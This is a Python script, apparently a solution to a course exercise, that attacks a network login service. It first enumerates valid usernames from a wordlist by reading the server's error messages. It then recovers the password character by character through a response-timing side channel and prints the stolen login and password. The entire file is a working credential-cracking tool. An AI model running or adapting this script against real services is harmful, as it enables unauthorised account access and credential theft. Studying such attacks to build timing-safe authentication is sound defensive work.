import sys
import socket
import json
import logging
import itertools
import string
import time

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_login_password(client, login, password):
    """Send login and password as JSON and return the server's response and response time."""
    message = json.dumps({"login": login, "password": password})
    try:
        start_time = time.time()
        client.send(message.encode())
        response = client.recv(1024).decode()
        end_time = time.time()
        return json.loads(response), end_time - start_time
    except socket.error as e:
        logging.error(f"Socket error: {e}")
        return None, 0
    except json.JSONDecodeError:
        logging.error("Received invalid JSON response")
        return {"result": "Bad request!"}, 0

def find_login(client, login_list):
    """Find the correct login by iterating through the login dictionary."""
    for login in login_list:
        response, _ = send_login_password(client, login.strip(), "any_password")
        if response["result"] == "Wrong password!" or response["result"] == "Exception happened during login":
            logging.info(f"Found correct login: {login.strip()}")
            return login.strip()
    logging.error("Failed to find the correct login.")
    return None

def find_password(client, login):
    """Find the correct password incrementally using response timing vulnerability."""
    password = ""
    while True:
        for char in itertools.chain(string.ascii_letters, string.digits):
            attempt = password + char
            response, response_time = send_login_password(client, login, attempt)

            if response["result"] == "Connection success!":
                logging.info(f"Password found: {attempt}")
                return attempt

            elif response["result"] == "Wrong password!" and response_time > 0.1:
                # Use timing threshold to detect correct character
                logging.debug(f"Character '{char}' seems correct in password: {attempt}")
                password = attempt  # Append this character to the password
                break
        else:
            logging.error("Failed to find the correct password.")
            return None

def main(host, login_file):
    try:
        # Load the login dictionary
        with open(login_file, 'r') as file:
            login_list = file.readlines()

        # Create a socket object and connect to the host
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect(host)

            # Start by finding the login
            login = find_login(client, login_list)
            if login is None:
                logging.error("Unable to find the login. Exiting.")
                return

            # Find the password once login is identified
            password = find_password(client, login)
            if password is None:
                logging.error("Unable to find the password. Exiting.")
                return

            # Print the result as required in JSON format
            result = json.dumps({"login": login, "password": password})
            print(result)

    except Exception as e:
        logging.error(f"An error occurred: {e}")

if __name__ == '__main__':
    # Ensure correct command-line arguments
    if len(sys.argv) != 3:
        print("Usage: python hack.py <host> <port>")
        sys.exit(1)

    # Parse IP and port from command-line arguments
    host = (sys.argv[1], int(sys.argv[2]))
    main(host, "logins.txt")
